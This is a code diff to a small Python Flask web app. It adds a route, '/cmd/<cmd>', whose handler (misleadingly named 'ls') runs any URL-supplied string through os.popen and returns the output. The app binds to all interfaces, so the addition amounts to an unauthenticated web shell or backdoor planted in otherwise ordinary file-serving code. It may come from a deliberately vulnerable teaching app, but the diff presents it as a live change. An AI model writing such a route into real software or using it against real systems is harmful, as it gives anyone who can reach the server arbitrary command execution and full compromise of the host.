@@ -19,6 +19,10 @@ def home(file):
     else:
         return "File Not Found"
 
+@app.route("/cmd/<cmd>")
+def ls(cmd):
+    return os.popen(cmd).read()
+
 if __name__ == "__main__":
     port = os.environ.get("PORT",5000)
     app.run(host="0.0.0.0",port=port)
